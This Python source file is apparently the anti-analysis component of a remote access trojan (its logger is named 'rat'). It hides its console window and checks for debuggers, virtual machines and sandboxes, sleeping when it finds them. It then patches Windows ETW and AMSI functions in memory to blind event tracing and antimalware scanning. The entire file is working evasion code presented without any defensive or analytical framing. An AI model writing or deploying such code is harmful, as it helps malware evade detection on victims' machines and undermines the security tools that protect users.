import os
import sys
import time
import random
import socket
import ctypes
import psutil
import logging

log = logging.getLogger("rat")

CREATE_NO_WINDOW = 0x08000000

def hide_console() -> None:
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        log.debug("hide_console: %s", e)

def is_debugger_present() -> bool:
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        is_remote = ctypes.c_bool(False)
        ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
            ctypes.windll.kernel32.GetCurrentProcess(),
            ctypes.byref(is_remote)
        )
        if is_remote.value:
            return True
    except Exception:
        pass
    return False

def check_vm_artifacts() -> bool:
    vm_processes = (
        "vmtoolsd.exe", "vmwaretray.exe", "vboxservice.exe", "vboxtray.exe",
        "qemu-ga.exe", "prl_tools.exe", "xenservice.exe"
    )
    try:
        for p in psutil.process_iter(['name']):
            name = (p.info['name'] or "").lower()
            if any(vm in name for vm in vm_processes):
                return True
    except Exception:
        pass
    vm_files = [
        r"C:\Windows\System32\drivers\vmmouse.sys",
        r"C:\Windows\System32\drivers\vmhgfs.sys",
        r"C:\Windows\System32\drivers\VBoxMouse.sys",
        r"C:\Windows\System32\drivers\VBoxGuest.sys",
        r"C:\Windows\System32\drivers\VBoxSF.sys",
    ]
    for f in vm_files:
        if os.path.exists(f):
            return True
    return False

def sandbox_check() -> bool:
    if is_debugger_present():
        return True
    try:
        if len(list(psutil.process_iter())) < 40:
            return True
    except Exception:
        pass
    bad = ("vmware", "virtualbox", "vbox", "qemu", "xen", "sandbox", "sample", "cuckoo")
    try:
        host = socket.gethostname().lower()
        user = os.getlogin().lower()
        if any(x in host or x in user for x in bad):
            return True
    except Exception:
        pass
    try:
        if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 1.5 * 1024**3:
            return True
    except Exception:
        pass
    if check_vm_artifacts():
        return True
    return False

def patch_amsi_etw() -> None:
    try:
        ntdll = ctypes.windll.kernel32.LoadLibraryW("ntdll.dll")
        etw = ctypes.windll.kernel32.GetProcAddress(ntdll, b"EtwEventWrite")
        if etw:
            old = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xC3", 1)
            ctypes.windll.kernel32.VirtualProtect(etw, 1, old.value, ctypes.byref(old))
        amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if amsi:
            scan = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if scan:
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
                ctypes.memmove(scan, b"\xB8\x57\x00\x07\x80\xC3", 6)
                ctypes.windll.kernel32.VirtualProtect(scan, 6, old.value, ctypes.byref(old))
            opensess = ctypes.windll.kernel32.GetProcAddress(amsi, b"AmsiOpenSession")
            if opensess:
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(opensess, 1, 0x40, ctypes.byref(old))
                ctypes.memmove(opensess, b"\xC3", 1)
                ctypes.windll.kernel32.VirtualProtect(opensess, 1, old.value, ctypes.byref(old))
    except Exception as e:
        log.debug("patch_amsi_etw: %s", e)

def anti_analysis() -> None:
    hide_console()
    if sandbox_check():
        log.warning("sandbox indicators detected, delaying")
        time.sleep(random.randint(30, 90))
    patch_amsi_etw()
